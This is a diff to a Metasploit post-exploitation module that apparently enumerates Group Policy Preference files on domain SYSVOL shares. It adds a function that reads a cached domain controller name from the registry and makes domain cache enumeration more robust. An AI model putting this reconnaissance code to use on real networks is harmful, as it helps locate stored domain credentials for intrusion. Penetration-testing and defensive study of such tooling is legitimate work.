@@ -47,7 +47,6 @@ class Metasploit3 < Msf::Post
 
 		register_options([
 			OptBool.new('ALL', [false, 'Enumerate all domains on network.', true]),
-			OptBool.new('PDC_USE_REGISTRY', [false, 'Use the target\'s PDC from registry.', true]),
 			OptBool.new('STORE', [false, 'Store the enumerated files in loot.', true]),
 			OptString.new('DOMAINS', [false, 'Enumerate list of space seperated domains DOMAINS="dom1 dom2".'])], self.class)
 	end
@@ -64,9 +63,9 @@ class Metasploit3 < Msf::Post
 		task_path_user = "USER\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"
 
 		domains = []
-		dcs = []
 		basepaths = []
 		fullpaths = []
+		cached_domain_controller = nil
 
 		print_status "Checking locally..."
 		locals = get_basepaths(client.fs.file.expand_path("%SYSTEMROOT%\\SYSVOL\\sysvol"))
@@ -93,7 +92,7 @@ class Metasploit3 < Msf::Post
 		# If we find a local policy store then assume we are on DC and do not wish to enumerate the current DC again.
 		# If user supplied domains we do not wish to enumerate registry retrieved domains.
 		if locals.blank? && user_domains.blank?
-			print_status "Enumerating Domains in the local registry..."
+			print_status "Enumerating domain information from the local registry..."
 			domains << get_domain_reg
 		end
 
@@ -101,8 +100,17 @@ class Metasploit3 < Msf::Post
 		domains.compact!
 		domains.uniq!
 
+		# Dont check registry if we find local files.
+		cached_dc = get_cached_domain_controller if locals.blank?
+		
 		domains.each do |domain|
 			dcs = enum_dcs(domain)
+			
+			# Add registry cached DC for the test case where no DC is enumerated on the network.
+			if cached_dc.match(domain)
+				dcs << cached_dc
+			end
+			
 			next if dcs.blank?
 			dcs.uniq!
 			tbase = []
@@ -119,21 +127,8 @@ class Metasploit3 < Msf::Post
 			end
 		end
 		
-		if datastore['PDC_USE_REGISTRY']
-			begin
-				subkey = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History"
-				v_name = "DCName"
-				dc = registry_getvaldata(subkey, v_name)[2..-1]
-				print_status "Searching for Policy Share on #{dc}..."
-				tbase = get_basepaths("\\\\#{dc}\\SYSVOL")
-				unless tbase.blank?
-					print_good "Found Policy Share on #{dc}"
-					basepaths << tbase
-				end
-			rescue
-				print_status("The target is not part of a domain, no PDC found in registry.")
-			end
-		end
+		# For the odd scenario where no domain controllers can be located on the network but a DC is cached in the registry
+
 		
 		basepaths.flatten!
 		basepaths.compact!
@@ -402,6 +397,20 @@ class Metasploit3 < Msf::Post
 		}
 		return hostnames
 	end
+	
+	# We use this for the odd test case where a DC is unable to be enumerated from the network
+	# but is cached in the registry.
+	def get_cached_domain_controller
+		begin
+			subkey = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\"
+			v_name = "DCName"
+			dc = registry_getvaldata(subkey, v_name).gsub(/\\/, '').upcase
+			print_status "Retrieved DC #{dc} from registry"
+			return dc
+		rescue
+			print_status("No DC found in registry")
+		end
+	end
 
 	def get_domain_reg
 		locations = []
@@ -411,7 +420,13 @@ class Metasploit3 < Msf::Post
 		locations << ["HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\", "MachineDomain"]
 
 		domains = []
-		registry_enumvals("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DomainCache\\").each() { |ud| domains << ud }
+		
+		# Pulls cached domains 
+		domain_cache = registry_enumvals("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DomainCache\\")
+		if domain_cache
+			domain_cache.each { |ud| domains << ud }
+		end
+		
 		locations.each do |location|
 			begin
 				subkey = location[0]
